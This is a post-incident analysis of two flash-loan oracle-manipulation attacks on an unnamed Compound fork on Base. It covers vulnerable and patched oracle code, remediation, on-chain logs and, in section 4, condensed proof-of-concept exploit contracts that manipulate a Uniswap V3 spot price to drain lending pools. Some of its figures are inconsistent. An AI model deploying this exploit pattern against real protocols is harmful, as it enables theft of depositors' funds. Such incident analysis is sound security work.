# Compound Fork (Base) — Flash Loan Price Manipulation Analysis

| Item | Details |
|------|------|
| **Date** | 2024-10-25 (TX1) / 2024-10-26 (TX2) |
| **Protocol** | Unknown Compound Fork (Base) |
| **Chain** | Base |
| **Loss** | ~$1,420,000 (estimated, combined across both attacks) |
| **Attacker 1** | [0x81d5...3aae2](https://basescan.org/address/0x81d5187c8346073B648f2D44B9E269509513aae2) |
| **Attacker 2** | [0xcd5e...364c8](https://basescan.org/address/0xcd5e7b6967c0e832fb908543cbd2564cfc9364c8) |
| **Attack Contract 1** | [0x7562...84901](https://basescan.org/address/0x7562846468089Cf0e8f7b38AC53406b895284901) |
| **Attack Contract 2** | [0x1F4E...Af64](https://basescan.org/address/0x1F4E6463E292382AE4F7a4E81DbE615EE90CAf64) |
| **Attack Tx 1** | [0x6ab5...149e](https://basescan.org/tx/0x6ab5b7b51f780e8c6c5ddaf65e9badb868811a95c1fd64e86435283074d3149e) |
| **Attack Tx 2** | [0x41a4...b6fe](https://basescan.org/tx/0x41a48c815a4958e53df17609d5212e133d7bcf5d626666da6feca3b0a06fb6fe) |
| **Vulnerable Contract (Oracle)** | [0x93D6...dD5a](https://basescan.org/address/0x93D619623abc60A22Ee71a15dB62EedE3EF4dD5a) |
| **Vulnerable Contract (Comptroller)** | [0xf91d...43D3](https://basescan.org/address/0xf91d26405fB5e489B7c4bbC11b9a5402aE9243D3) |
| **Root Cause** | Exploitation of oracle price dependency after manipulating Uniswap V3 spot price via flash loan |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-10/CompoundFork_exploit.sol) |

---

## 1. Vulnerability Overview

This incident involves **two consecutive flash loan attacks** against an unidentified Compound v2 fork protocol deployed on the Base chain.

The core of the attack lies in the protocol's price oracle (`getUnderlyingPrice`) **directly depending on the Uniswap V3 spot price** to return real-time quotes. The attacker leveraged a large flash loan (800 WETH) to, within the same transaction:

1. Inject 500 WETH into the Uniswap V3 WETH/uSUI pool to artificially inflate the uSUI price
2. Use only a small amount of uSUI to claim grossly overvalued collateral
3. Withdraw the protocol's entire liquidity (WETH and other assets) in excess of the collateral

The second attack (TX2) targeted other lending markets — including 1FBAXXXX (token) and B1A03E (token) — to drain additional assets, after the first attack had nearly exhausted all WETH from the cWETH market.

---

## 2. Vulnerable Code Analysis

### 2.1 Spot Price Oracle Dependency (Core Vulnerability)

**Vulnerable Code (estimated — source unverified, based on bytecode reverse engineering)**

```solidity
// ❌ Vulnerable: directly uses Uniswap V3 spot price
// Contract: 0x93D619623abc60A22Ee71a15dB62EedE3EF4dD5a
contract CompoundForkOracle {
    // Queries the current spot price from the uSUI/WETH Uniswap V3 pool
    function getUnderlyingPrice(address cToken) external returns (uint256) {
        address underlying = IcToken(cToken).underlying();
        uint8 decimals = IERC20(underlying).decimals();
        
        // ❌ Vulnerable point: uses sqrtPriceX96 from slot0() to compute spot price
        // Can be manipulated within the same transaction via flash loan
        (uint160 sqrtPriceX96,,,,,,) = IUniswapV3Pool(pool).slot0();
        uint256 price = getPriceFromSqrt(sqrtPriceX96);
        
        // Decimal normalization
        return price * (10 ** (18 - decimals));
    }
}
```

**Fixed Code (post-patch)**

```solidity
// ✅ Fixed: uses TWAP (time-weighted average price) for manipulation resistance
contract CompoundForkOracleFixed {
    uint32 public constant TWAP_PERIOD = 1800; // 30-minute TWAP

    function getUnderlyingPrice(address cToken) external returns (uint256) {
        address underlying = IcToken(cToken).underlying();
        uint8 decimals = IERC20(underlying).decimals();
        
        // ✅ Fixed: uses observe() to query TWAP — cannot be manipulated within a single transaction
        uint32[] memory secondsAgos = new uint32[](2);
        secondsAgos[0] = TWAP_PERIOD; // 30 minutes ago
        secondsAgos[1] = 0;           // current
        
        (int56[] memory tickCumulatives,) = IUniswapV3Pool(pool).observe(secondsAgos);
        int56 tickCumulativesDelta = tickCumulatives[1] - tickCumulatives[0];
        int24 timeWeightedAverageTick = int24(tickCumulativesDelta / int56(uint56(TWAP_PERIOD)));
        
        uint256 twapPrice = getPriceFromTick(timeWeightedAverageTick);
        return twapPrice * (10 ** (18 - decimals));
    }
}
```

**Issue**: The `sqrtPriceX96` from `slot0()` returns the spot price of the current block. Executing a large swap within a flash loan immediately changes this value in the same transaction, causing the oracle to return the manipulated price as a trusted quote.

---

### 2.2 Comptroller Collateral Liquidity Calculation

**Vulnerable Code (estimated)**

```solidity
// ❌ Vulnerable: collateral value is evaluated with manipulated oracle immediately after enterMarkets()
contract Comptroller {
    function getAccountLiquidity(address account) external returns (
        uint256 liquidity,
        uint256 shortfall
    ) {
        // Sum collateral value across each market
        for (uint i = 0; i < markets[account].length; i++) {
            address cToken = markets[account][i];
            
            // ❌ Vulnerable: manipulated oracle price is applied directly
            uint256 price = oracle.getUnderlyingPrice(cToken);
            uint256 balance = ICToken(cToken).balanceOf(account);
            uint256 collateralFactor = markets[cToken].collateralFactorMantissa;
            
            liquidity += balance * price * collateralFactor / 1e36;
        }
    }
}
```

**Issue**: When the oracle is manipulated, `getAccountLiquidity()` returns a collateral value tens of times higher than actual, allowing the attacker to borrow far in excess of their collateral.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- No prior setup required (completed in a single transaction)
- Attacker EOA deploys the attack contract, then calls the `start()` or `doTask()` function

### 3.2 Execution Phase (TX1)

```
┌─────────────────────────────────────────┐
│  Attacker EOA                            │
│  0x81d5187c...                          │
└────────────────┬────────────────────────┘
                 │ 1. Call start() / doTask()
                 ▼
┌─────────────────────────────────────────┐
│  EXPLOIT_DO3 Contract                   │
│  0x75628464...                          │
└────────────────┬────────────────────────┘
                 │ 2. flashLoan(WETH, 800e18)
                 ▼
┌─────────────────────────────────────────┐
│  Morpho Blue Flash Loan Provider         │
│  0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37.. │
│  → Borrow 800 WETH                      │
└────────────────┬────────────────────────┘
                 │ 3. onMorphoFlashLoan() callback
                 ▼
┌─────────────────────────────────────────┐
│  EXPLOIT_DO3: Flash loan callback exec  │
│                                         │
│  3a. enterMarkets([cSUI])               │
│  3b. mint(cWETH, 15 WETH)              │
│      → Deposit 15 WETH, receive cWETH   │
│  3c. borrow(cSUI, 13,982 uSUI total)   │
│      → Drain all uSUI from cSUI pool    │
└────────────────┬────────────────────────┘
                 │ 4. Transfer WETH(785) + uSUI(13,982) → Helper
                 ▼
┌─────────────────────────────────────────┐
│  Helper Contract (executes d() function) │
│                                         │
│  4a. enterMarkets([this])               │
│  4b. Uniswap V3: swap 500 WETH → uSUI  │
│      uSUI price inflated tens of times  │
└────────────────┬────────────────────────┘
                 │ 5. Confirm oracle manipulation
                 ▼
┌─────────────────────────────────────────┐
│  Vulnerable Oracle                      │
│  0x93D619623abc60A22...                 │
│                                         │
│  getUnderlyingPrice(cSUI)               │
│  → Returns Uniswap V3 slot0 spot price  │
│  ❌ Manipulated price = ~tens of times  │
│     the normal price                    │
└────────────────┬────────────────────────┘
                 │ 6. Drain all cWETH using manipulated collateral value
                 ▼
┌─────────────────────────────────────────┐
│  Helper: borrow against inflated collat │
│                                         │
│  6a. mint(cSUI, 50 uSUI)               │
│      → Collateral accepted at inflated  │
│        manipulated price                │
│  6b. getAccountLiquidity() → over-valued│
│  6c. borrow(cWETH, 262.4 WETH total)  │
│      → Drain entire cWETH pool liquidity│
└────────────────┬────────────────────────┘
                 │ 7. Swap remaining uSUI back to WETH
                 ▼
┌─────────────────────────────────────────┐
│  Helper: uSUI liquidation swap          │
│                                         │
│  7a. Uniswap V3: all uSUI → 349 WETH   │
│  7b. All WETH → sent to EXPLOIT_DO3    │
│  7c. selfdestruct()                     │
└────────────────┬────────────────────────┘
                 │ 8. Repay 800 WETH flash loan
                 ▼
┌─────────────────────────────────────────┐
│  Net Profit Settlement                  │
│                                         │
│  Total received: ~1,056 WETH           │
│  Repaid: 800 WETH (Morpho)             │
│  Net profit: ~256 WETH (~$665,000)     │
│  Protocol damage: cWETH liquidity fully │
│  drained                                │
└─────────────────────────────────────────┘
```

### 3.3 Outcome

| Item | TX1 (2024-10-25) | TX2 (2024-10-26) |
|------|-----------------|-----------------|
| Attacker | 0x81d5...3aae2 | 0xcd5e...364c8 |
| Flash loan size | 800 WETH | 800 WETH |
| Stolen assets | 247.4 WETH (~$643K) + 13,982 uSUI (~$27K) | Remaining WETH + 12,332 1fba65 tokens + 161,491 b1a03e tokens |
| Net profit | ~256 WETH | Other assets |

---

## 4. PoC Code (DeFiHackLabs Core Logic)

```solidity
// Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-10/CompoundFork_exploit.sol
// Chain: Base | Block: 21,512,062 fork

contract EXPLOIT_DO3 {
    function doTask() public payable {
        // [Step 1] Request 800 WETH flash loan from Morpho
        Flashable(MORPHO_BLUE).flashLoan(address(weth), 800 ether, "");
        
        // [Step 8] Transfer net profit WETH to caller (test contract)
        weth.transfer(msg.sender, weth.balanceOf(address(this)));
    }

    function onMorphoFlashLoan(uint256, bytes calldata) external {
        // [Step 2] Approve cWETH market
        weth.approve(cWETH, type(uint256).max);
        
        // [Step 3] Register cSUI as collateral market in Comptroller
        address[] memory s = new address[](1);
        s[0] = cSUI;
        IMarketM(COMPTROLLER).enterMarkets(s);
        
        // [Step 4] Deposit 15 WETH into cWETH → receive cWETH tokens
        Mintable(cWETH).mint(15 ether);
        
        // [Step 5] Drain all uSUI from cSUI market (no collateral required)
        Borrowable(cSUI).borrow(IERC20(uSUI).balanceOf(address(cSUI)));
        
        // [Step 6] Transfer all WETH + uSUI to Helper
        Helper helper = new Helper();
        weth.transfer(address(helper), weth.balanceOf(address(this)));
        IERC20(uSUI).transfer(address(helper), IERC20(uSUI).balanceOf(address(this)));
        
        // [Step 7] Perform price manipulation + borrow in Helper
        helper.d(address(this));
        
        // [Step 8] Approve Morpho repayment
        weth.approve(MORPHO_BLUE, type(uint256).max);
    }
}

contract Helper {
    function d(address self) external {
        // [Step 7a] Uniswap V3: large swap 500 WETH → uSUI → manipulate uSUI price
        IUniswapV3Router(UniswapV3Router).exactInputSingle(
            ExactInputSingleParams(address(weth), uSUI, 200, address(this),
                block.timestamp, 500 ether, 1, 1000 ether)
        );
        
        // [Step 7b] Confirm manipulated oracle price (vulnerability: returns slot0 spot price)
        // At this point uSUI price has surged tens of times
        IUnderlyingPrice(ORACLE).getUnderlyingPrice(cSUI);
        
        // [Step 7c] Deposit only 50 uSUI as cSUI collateral (grossly overvalued at manipulated price)
        IERC20(uSUI).approve(cSUI, type(uint256).max);
        Mintable(cSUI).mint(50 ether);
        
        // [Step 7d] Drain entire cWETH liquidity using manipulated collateral value
        Borrowable(cWETH).borrow(weth.balanceOf(cWETH));
        
        // [Step 7e] Reverse-swap remaining uSUI → WETH to fund flash loan repayment
        IUniswapV3Router(UniswapV3Router).exactInputSingle(
            ExactInputSingleParams(uSUI, address(weth), 200, address(this),
                block.timestamp, IERC20(uSUI).balanceOf(address(this)), 1, 0)
        );
        
        // [Step 7f] Return all WETH to EXPLOIT_DO3
        weth.transfer(self, weth.balanceOf(address(this)));
        selfdestruct(payable(self));
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Uniswap V3 spot price oracle manipulation | CRITICAL | CWE-840 (Business Logic Errors) |
| V-02 | No defense against price manipulation within flash loan | CRITICAL | CWE-362 (Race Condition) |
| V-03 | Single price source dependency (lack of oracle diversification) | HIGH | CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) |
| V-04 | Missing borrow cap validation for cSUI/cWETH | HIGH | CWE-400 (Uncontrolled Resource Consumption) |

---

### V-01: Uniswap V3 Spot Price Oracle Manipulation

- **Description**: The protocol oracle directly uses the real-time spot price returned by `slot0()` of a Uniswap V3 pool for collateral valuation. Performing a large swap within the same transaction via a flash loan immediately changes the `sqrtPriceX96` value, causing the oracle to return the manipulated price as a trusted quote.
- **Impact**: The attacker can withdraw the protocol's entire WETH liquidity (247 WETH) using only a tiny amount of collateral (50 uSUI).
- **Attack Condition**: The Uniswap V3 pool liquidity for the target token (uSUI) must be low enough that ~500 WETH can meaningfully manipulate the price.

---

### V-02: No Defense Against Price Manipulation Within Flash Loan

- **Description**: The protocol has no mechanism to detect or block oracle queries within a flash loan callback context. A properly designed lending protocol requires a circuit breaker or valid price range validation against intra-block price movements.
- **Impact**: Any attacker with access to flash loan facilities can execute price manipulation followed by over-borrowing with zero capital.
- **Attack Condition**: Access to a flash loan provider such as Morpho Blue.

---

### V-03: Single Price Source Dependency

- **Description**: Collateral valuation relies on a single on-chain DEX spot price. No external price feeds such as Chainlink or Band Protocol, nor TWAP prices, are used in parallel.
- **Impact**: A single point of failure exposes the protocol's entire liquidity.
- **Attack Condition**: Circumstances where DEX pool manipulation is economically profitable.

---

### V-04: Missing Borrow Cap Validation for cSUI/cWETH

- **Description**: The `borrow()` function allows the entire liquidity pool balance to be withdrawn in a single call. Most mature Compound forks set a `borrowCap` (maximum borrow limit) to prevent full pool drainage.
- **Impact**: The entire uSUI balance of the cSUI market (13,982 uSUI) and the entire WETH balance of the cWETH market can be drained in a single transaction.
- **Attack Condition**: `borrowCap` is set to 0 (disabled).

---

## 6. Remediation Recommendations

### Immediate Actions

**1) Replace with TWAP Oracle (Highest Priority)**

```solidity
// ✅ Fixed: TWAP price calculation using OracleLibrary.consult()
import "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";

contract SafeCompoundForkOracle {
    uint32 public constant TWAP_PERIOD = 1800; // 30-minute TWAP (minimum recommended)
    
    function getUnderlyingPrice(address cToken) external view returns (uint256) {
        address underlying = IcToken(cToken).underlying();
        address pool = getPool(underlying);
        
        // ✅ Uses 30-minute TWAP — cannot be manipulated within a single transaction
        (int24 arithmeticMeanTick,) = OracleLibrary.consult(pool, TWAP_PERIOD);
        uint256 twapPrice = OracleLibrary.getQuoteAtTick(
            arithmeticMeanTick, 1e18, underlying, WETH
        );
        return twapPrice;
    }
}
```

**2) Price Deviation Validation (Circuit Breaker)**

```solidity
// ✅ Fixed: block transactions when deviation between spot and TWAP exceeds threshold
function getUnderlyingPriceWithCheck(address cToken) external returns (uint256) {
    uint256 spotPrice = getSpotPrice(cToken);   // slot0-based
    uint256 twapPrice = getTWAPPrice(cToken);   // 30-minute TWAP-based
    
    // ✅ Halt if the two prices deviate by more than 5%, suspecting oracle manipulation
    uint256 deviation = spotPrice > twapPrice
        ? (spotPrice - twapPrice) * 1e18 / twapPrice
        : (twapPrice - spotPrice) * 1e18 / twapPrice;
    
    require(deviation <= 5e16, "Oracle: price deviation too high"); // 5% threshold
    return twapPrice; // Return safe TWAP price
}
```

**3) Set Borrow Caps**

```solidity
// ✅ Fixed: enable borrowCap in Comptroller
// Limit single borrow to no more than 80% of each market's TVL
comptroller._setMarketBorrowCaps(
    [cWETH, cSUI],
    [maxBorrowWETH, maxBorrowSUI]  // 80% of TVL
);
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Spot price dependency | Chainlink feed + TWAP dual validation, deviation threshold ≤ 5% |
| V-02 No flash loan defense | Apply `nonReentrant` + flash loan callback detection (balance change monitoring) |
| V-03 Single source | Chainlink as primary, Uniswap TWAP as secondary oracle in parallel |
| V-04 No caps | Enable `borrowCap` and `supplyCap`, cap at 80% of pool TVL |
| Additional | Separate pause guardian role and auto-pause on anomalous transaction detection |

---

## 7. Lessons Learned

1. **Spot prices must never be used as oracles**: Uniswap `slot0()` returns the instantaneous price of the current block and can be manipulated at zero cost via flash loans. Collateral valuation must use TWAP (time-weighted average price, minimum 30 minutes) or a manipulation-resistant feed such as Chainlink.

2. **Oracle replacement should be the top audit priority for Compound forks**: While the original Compound v2 uses a Chainlink-based oracle, many fork protocols replace it with a simple DEX spot price, introducing a critical vulnerability. Related cases: Onyx Protocol (2023-11, ERC4626 inflation), Radiant Capital (2024-01, empty market rounding).

3. **The same vulnerability immediately leads to copycat attacks**: Only one day after TX1 (2024-10-25), a different attacker (TX2, 2024-10-26) reused the same vulnerability to drain the remaining assets. All markets should have been paused immediately upon detection of the first attack.

4. **Setting a liquidity cap (`borrowCap`) limits the scale of damage**: Had a borrow cap been in place, the attacker would have been prevented from draining the entire pool in a single transaction.

5. **Small/new DEX pools are especially vulnerable to price manipulation**: The uSUI/WETH Uniswap V3 pool had sufficiently low liquidity that 500 WETH was enough to meaningfully manipulate the price. Stricter oracle standards are required when accepting tokens with shallow liquidity as collateral.

---

## 8. On-Chain Verification

### 8.1 TX1 (0x6ab5...149e) — PoC vs On-Chain Amounts Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|-----------|-------------|-----------|
| Morpho flash loan | 800 WETH | 800 WETH | ✅ Match |
| cWETH deposit | 15 WETH | 15 WETH | ✅ Match |
| uSUI withdrawn from cSUI | `balanceOf(cSUI)` | 13,982.87 uSUI | ✅ Match |
| Uniswap V3 swap input | 500 WETH (PoC Helper) | 785 WETH transferred then partial swap | ✅ Approximate match |
| WETH withdrawn from cWETH | `balanceOf(cWETH)` | 262.44 WETH | ✅ Match |
| Net profit | — | 256.05 WETH (~$665,000) | ✅ Verified |

### 8.2 On-Chain Event Log Sequence (TX1)

```
1. FlashLoan  : Morpho → EXPLOIT_DO3 (800 WETH)
2. Transfer   : WETH, EXPLOIT_DO3 → cWETH (15 WETH) — mint
3. Transfer   : cWETH → EXPLOIT_DO3 (cWETH tokens 0 — sub-decimal)
4. Transfer   : uSUI, cSUI → EXPLOIT_DO3 (13,982.87 uSUI) — borrow
5. Transfer   : WETH, EXPLOIT_DO3 → Helper (785 WETH)
6. Transfer   : uSUI, EXPLOIT_DO3 → Helper (13,982.87 uSUI)
7. Transfer   : WETH, Helper → Uniswap V3 Pool (500 WETH) — price inflate
8. Transfer   : uSUI, Uniswap V3 Pool → Helper (432,241 uSUI)
9. Transfer   : uSUI, Helper → cSUI (50 uSUI) — mint collateral
10. AccrueInterest: cWETH
11. Transfer  : WETH, cWETH → Helper (262.44 WETH) — borrow ALL
12. Transfer  : uSUI, Helper → Uniswap V3 Pool (remaining uSUI)
13. Transfer  : WETH, Uniswap V3 Pool → Helper (349.33 WETH)
14. Transfer  : WETH, Helper → EXPLOIT_DO3 (total WETH)
15. Transfer  : WETH, EXPLOIT_DO3 → Morpho (800 WETH) — repay
```

### 8.3 Pre-condition Verification (Block 21,512,062 — Immediately Before Attack)

| Item | Value |
|------|-----|
| WETH balance in cWETH | 247.44 WETH ($643,340) |
| uSUI balance in cSUI | 13,982.87 uSUI ($27,267) |
| uSUI oracle price (pre-attack) | 1.9458 USD (1.945e18 wei) |
| uSUI oracle price (post-attack) | 1.9419 USD (minimal change — TWAP effect) |
| Attacker WETH balance (pre-attack) | 0 WETH |
| Attack contract WETH balance (post-attack) | 256.05 WETH |

> **Note**: The small apparent difference in oracle price before and after the attack is because `getUnderlyingPrice()` returns the spot price at the time of the call. **Inside** the attack transaction, the 500 WETH swap caused the price to momentarily spike by tens of times; however, once the transaction completed, the reverse uSUI swap restored the price to its original level.

---

*Written: Based on the 2024-10-25 incident | Analysis date: 2026-04-11*
*PoC reference: [DeFiHackLabs CompoundFork_exploit.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-10/CompoundFork_exploit.sol)*